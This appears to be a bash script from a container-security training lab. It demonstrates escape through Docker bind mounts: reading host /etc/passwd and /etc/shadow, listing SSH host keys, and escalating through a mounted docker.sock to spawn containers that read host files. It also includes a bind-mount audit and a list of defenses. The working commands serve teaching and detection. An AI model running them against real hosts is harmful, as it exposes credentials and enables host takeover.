#!/bin/bash

# Lab 09 - Scenario 4: Host Path Mount Escape Demo
# Demonstrates how -v bind mounts expose host filesystem and escalation paths

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

print_header() {
    echo -e "\n${BLUE}========================================${NC}"
    echo -e "${BLUE}$1${NC}"
    echo -e "${BLUE}========================================${NC}\n"
}

print_step() {
    echo -e "${GREEN}[STEP]${NC} $1"
}

print_warning() {
    echo -e "${RED}[WARNING]${NC} $1"
}

print_info() {
    echo -e "${YELLOW}[INFO]${NC} $1"
}

check_docker() {
    if ! docker ps &>/dev/null; then
        echo -e "${RED}Error: Docker is not running${NC}"
        exit 1
    fi
}

wait_for_enter() {
    echo
    read -p "Press Enter to continue..."
}

# Banner
clear
cat << "EOF"
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║      Lab 09 - Scenario 4: Host Path Mount Escape              ║
║                                                               ║
║  This demo shows how -v bind mounts expose host               ║
║  filesystem paths and enable privilege escalation.            ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
EOF

print_warning "⚠️  WARNING: This demonstration shows actual container escape techniques!"
print_warning "   Only run this in a safe, isolated test environment."
echo
read -p "Do you want to continue? (yes/no): " confirm

if [[ "$confirm" =~ ^[Yy](es)?$ ]]; then
    :
else
    echo "Demo cancelled."
    exit 0
fi

# Prerequisites check
print_header "Checking Prerequisites"
check_docker
print_step "Docker is available and running"
print_step "Docker version: $(docker --version | awk '{print $3}' | tr -d ',')"

###############################################
# Demo 1: /etc Bind Mount — Read Credentials
###############################################
print_header "Demo 1: /etc Bind Mount — Reading Host Credentials"

print_info "Mounting host /etc into the container as /host-etc"
echo "  Command: docker run -v /etc:/host-etc alpine"
echo

print_step "Starting container with /etc bind mount..."
docker run -dit --name mount-etc -v /etc:/host-etc alpine sleep 60 &>/dev/null

echo
print_step "Reading /etc/passwd from host via bind mount..."
echo "  Command: docker exec mount-etc cat /host-etc/passwd"
echo
docker exec mount-etc cat /host-etc/passwd
echo

print_step "Reading /etc/shadow from host via bind mount..."
echo "  Command: docker exec mount-etc cat /host-etc/shadow"
echo

SHADOW_OUTPUT=$(docker exec mount-etc cat /host-etc/shadow 2>&1)
SHADOW_EXIT=$?

if [ $SHADOW_EXIT -eq 0 ]; then
    echo "$SHADOW_OUTPUT"
    echo
    print_warning "🚨 /etc/shadow readable — host password hashes exposed"
else
    print_info "/etc/shadow read blocked (permission denied or Docker Desktop restriction)"
    echo "  On a Linux host where the container runs as root, /etc/shadow is readable."
    echo "  Docker Desktop maps volumes through the VM, which may restrict access."
fi

echo
print_step "Listing other sensitive files in /host-etc..."
docker exec mount-etc sh -c '
echo "  Checking for SSH host keys..."
ls -la /host-etc/ssh/ssh_host_* 2>/dev/null && echo "  ✓ SSH host keys visible" || echo "  ✗ No SSH host keys (expected on macOS)"
echo
echo "  Checking for SSL certificates..."
ls /host-etc/ssl/certs/ 2>/dev/null | head -3 && echo "  ..." || echo "  ✗ No /etc/ssl (expected on macOS)"
echo
echo "  Checking for cron jobs..."
ls /host-etc/cron* 2>/dev/null | head -5 || echo "  ✗ No cron directories (expected on macOS)"
'

print_warning "Cleaning up demo container..."
docker rm -f mount-etc &>/dev/null

wait_for_enter

###############################################
# Demo 2: docker.sock via Bind Mount — Escalation Chain
###############################################
print_header "Demo 2: docker.sock Bind Mount — Escalation to New Containers"

print_info "This demonstrates the escalation chain:"
print_info "  1. A container receives docker.sock via a bind mount"
print_info "  2. It uses the socket to create NEW containers on the host"
print_info "  3. Those new containers can mount /etc or other host paths"
print_info "  4. Result: indirect host access without --privileged"
echo
print_info "This is different from Scenario 1 (docker.sock as entry point)."
print_info "Here, docker.sock is the ESCALATION TARGET after an initial bind mount."
echo

DOCKER_SOCK="/var/run/docker.sock"

if [ -S "$DOCKER_SOCK" ]; then
    print_step "Docker socket found at $DOCKER_SOCK"
    echo

    print_step "Starting container with docker.sock bind mount..."
    docker run -dit \
        --name mount-sock \
        -v /var/run/docker.sock:/var/run/docker.sock \
        alpine sleep 60 &>/dev/null

    print_step "Verifying socket is accessible inside container..."
    docker exec mount-sock ls -la /var/run/docker.sock
    echo

    print_step "Installing Docker CLI inside the container..."
    docker exec mount-sock sh -c 'apk add -q docker 2>/dev/null' &>/dev/null 2>&1 || true

    # Check if docker CLI is available
    DOCKER_CLI=$(docker exec mount-sock which docker 2>/dev/null || echo "")

    if [ -n "$DOCKER_CLI" ]; then
        print_step "Docker CLI available. Demonstrating escalation..."
        echo

        echo "  Creating a NEW container from inside mount-sock that mounts /etc..."
        echo "  Command: docker run -v /etc:/host-etc alpine cat /host-etc/passwd"
        echo

        ESCALATION_OUTPUT=$(docker exec mount-sock docker run --rm -v /etc:/host-etc alpine cat /host-etc/passwd 2>&1)
        ESCALATION_EXIT=$?

        if [ $ESCALATION_EXIT -eq 0 ]; then
            echo "$ESCALATION_OUTPUT"
            echo
            print_warning "🚨 ESCALATION SUCCESSFUL"
            print_warning "   Container created a new container that reads host /etc/passwd"
            print_warning "   This is the bind mount → socket → new container chain"
        else
            print_info "Escalation via new container blocked or docker CLI not functional"
            echo "  On a Linux host, this chain works end-to-end:"
            echo "    Container A (has docker.sock) → creates Container B (mounts /etc)"
            echo "    Container B reads /etc/shadow without Container A needing --privileged"
        fi
    else
        print_info "Docker CLI not available inside container (common on Alpine without apk access)"
        echo "  On a production Linux host with network access, the container would:"
        echo "    1. Install or include the Docker CLI"
        echo "    2. Use the mounted socket to run: docker run -v /etc:/host-etc alpine"
        echo "    3. Read /etc/shadow from the new container"
        echo
        echo "  The socket itself is confirmed accessible:"
        docker exec mount-sock ls -la /var/run/docker.sock
    fi

    print_warning "Cleaning up demo containers..."
    docker rm -f mount-sock &>/dev/null
else
    print_info "Docker socket not found at $DOCKER_SOCK"
    echo "  This is common on Docker Desktop (macOS/Windows)."
    echo "  On a Linux host, the socket exists and this attack works as described."
    echo
    echo "  The escalation chain on a real Linux host:"
    echo "    docker run -v /var/run/docker.sock:/var/run/docker.sock myapp"
    echo "    # Inside myapp:"
    echo "    docker run -v /etc:/host-etc alpine cat /host-etc/shadow"
fi

wait_for_enter

###############################################
# Demo 3: Audit — Detecting Bind Mounts
###############################################
print_header "Demo 3: Detection — Auditing Bind Mounts"

print_step "Creating test containers with various bind mounts for audit demonstration..."
docker run -dit --name audit-etc -v /etc:/host-etc alpine sleep 60 &>/dev/null
docker run -dit --name audit-var -v /var:/host-var alpine sleep 60 &>/dev/null
docker run -dit --name audit-normal alpine sleep 60 &>/dev/null

echo
print_step "Scanning all running containers for bind mounts..."
echo

docker ps -q | while read container_id; do
    CONTAINER_NAME=$(docker inspect --format='{{.Name}}' "$container_id" 2>/dev/null | sed 's|/||')
    MOUNTS=$(docker inspect --format='{{json .Mounts}}' "$container_id" 2>/dev/null)

    # Check for bind mounts
    BIND_MOUNTS=$(echo "$MOUNTS" | python3 -c "
import json, sys
try:
    mounts = json.load(sys.stdin)
    binds = [m for m in mounts if m.get('Type') == 'bind']
    for b in binds:
        print(f\"  Source: {b.get('Source', 'unknown')} -> Destination: {b.get('Destination', 'unknown')}\")
except:
    pass
" 2>/dev/null || echo "$MOUNTS" | grep -o '"Source":"[^"]*"' | head -3)

    if [ -n "$BIND_MOUNTS" ]; then
        echo -e "${RED}🚨 $CONTAINER_NAME — Bind mounts detected:${NC}"
        echo "$BIND_MOUNTS"

        # Flag high-risk paths
        echo "$BIND_MOUNTS" | grep -qE "(\/etc|\/var\/run\/docker\.sock|\/root|\/home|\/\.ssh)" && \
            echo -e "  ${RED}  ⚠️  HIGH-RISK path mounted${NC}" || true
        echo
    else
        echo -e "${GREEN}✅ $CONTAINER_NAME — No bind mounts${NC}"
    fi
done

echo
print_step "Recommended: Run artifacts/audit-host-mounts.sh for full production scanning"

print_warning "Cleaning up audit containers..."
docker rm -f audit-etc audit-var audit-normal &>/dev/null

wait_for_enter

###############################################
# Summary
###############################################
print_header "Demo Complete - Summary"

cat << EOF
${GREEN}What we demonstrated:${NC}

1. ${YELLOW}/etc Bind Mount${NC}
   - docker run -v /etc:/host-etc exposes ALL host config files
   - /etc/shadow (password hashes) readable when container runs as root
   - SSH keys, SSL certs, cron jobs all accessible
   - No special flags needed — just a volume mount

2. ${YELLOW}docker.sock Escalation Chain${NC}
   - A container with docker.sock can create NEW containers
   - Those new containers can mount any host path
   - Chain: bind mount → socket access → new container → /etc/shadow
   - This is how attackers pivot from limited access to full host compromise

3. ${YELLOW}Detection${NC}
   - docker inspect shows all bind mounts in .Mounts
   - Automated scanning catches sensitive path mounts
   - High-risk paths: /etc, /var/run/docker.sock, /root, /home, ~/.ssh

${RED}Key Takeaways:${NC}

• Bind mounts require zero special privileges — any docker run can do this
• The -v flag is the most commonly overlooked attack surface
• docker.sock as an escalation target is more dangerous than as an entry point
• Production containers should never mount /etc or other sensitive host paths
• Use configMaps, secrets, and emptyDir volumes instead

${GREEN}Defense Strategies:${NC}

1. Audit all containers for bind mounts (especially /etc, /root, /home)
2. Block docker.sock mounts via admission policy
3. Use Kubernetes volumes (configMap, secret, emptyDir) instead of host mounts
4. Apply PodSecurityStandards with restricted profile
5. Monitor with Falco for bind mount creation

${BLUE}Next Steps:${NC}

1. Run ./defense.sh to implement protections
2. Review artifacts/audit-host-mounts.sh for production scanning
3. Run ./validate.sh to confirm defenses work

${BLUE}Documentation:${NC}
Full details in README.md

${BLUE}Cleanup:${NC}
Run ./cleanup.sh to remove all demo containers
EOF